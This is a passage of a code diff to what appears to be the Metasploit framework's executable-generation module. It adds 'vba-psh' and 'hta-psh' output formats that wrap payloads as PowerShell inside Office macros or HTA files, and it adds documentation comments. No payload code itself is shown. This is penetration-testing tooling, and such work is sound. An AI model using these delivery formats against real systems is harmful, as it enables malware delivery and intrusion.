-;		  sub esp, 44             ; Move stack pointer back past the handler
+;     sub esp, 44            ; Move stack pointer back past the handler
     ^
 
     stub_final = %Q^
@@ -1755,7 +2037,7 @@ require 'msf/core/exe/segment_appender'
   # Generate an executable of a given format suitable for running on the
   # architecture/platform pair.
   #
-  # This routine is shared between msfencode, rpc, and payload modules (use
+  # This routine is shared between msfvenom, rpc, and payload modules (use
   # <payload>)
   #
   # @param framework [Framework]
@@ -1904,6 +2186,8 @@ require 'msf/core/exe/segment_appender'
     when 'vba-exe'
       exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
       Msf::Util::EXE.to_exe_vba(exe)
+    when 'vba-psh'
+      Msf::Util::EXE.to_powershell_vba(framework, arch, code)
     when 'vbs'
       exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
       Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => false }))
@@ -1924,9 +2208,14 @@ require 'msf/core/exe/segment_appender'
       Msf::Util::EXE.to_win32pe_psh_reflection(framework, code, exeopts)
     when 'psh-cmd'
       Msf::Util::EXE.to_powershell_command(framework, arch, code)
+    when 'hta-psh'
+      Msf::Util::EXE.to_powershell_hta(framework, arch, code)
     end
   end
 
+  # FMT Formats
+  # self.to_executable_fmt_formats
+  # @return [Array] Returns an array of strings
   def self.to_executable_fmt_formats
     [
       "asp",
@@ -1939,6 +2228,7 @@ require 'msf/core/exe/segment_appender'
       "exe-only",
       "exe-service",
       "exe-small",
+      "hta-psh",
       "loop-vbs",
       "macho",
       "msi",
@@ -1950,6 +2240,7 @@ require 'msf/core/exe/segment_appender'
       "psh-cmd",
       "vba",
       "vba-exe",
+      "vba-psh",
       "vbs",
       "war"
     ]
@@ -1957,7 +2248,7 @@ require 'msf/core/exe/segment_appender'
 
   #
   # EICAR Canary
-  #
+  # @return [Boolean] Should return true
   def self.is_eicar_corrupted?
     path = ::File.expand_path(::File.join(
       ::File.dirname(__FILE__),"..", "..", "..", "data", "eicar.com")
@@ -1977,12 +2268,23 @@ require 'msf/core/exe/segment_appender'
     ret
   end
 
+  # self.get_file_contents
+  #
+  # @param perms  [String]
+  # @param file   [String]
+  # @return       [String]
   def self.get_file_contents(file, perms = "rb")
     contents = ''
     File.open(file, perms) {|fd| contents = fd.read(fd.stat.size)}
     contents
   end
 
+  # self.find_payload_tag
+  #
+  # @param mo       [String]
+  # @param err_msg  [String]
+  # @raise [RuntimeError] if the "PAYLOAD:" is not found
+  # @return         [Fixnum]
   def self.find_payload_tag(mo, err_msg)
     bo = mo.index('PAYLOAD:')
     unless bo
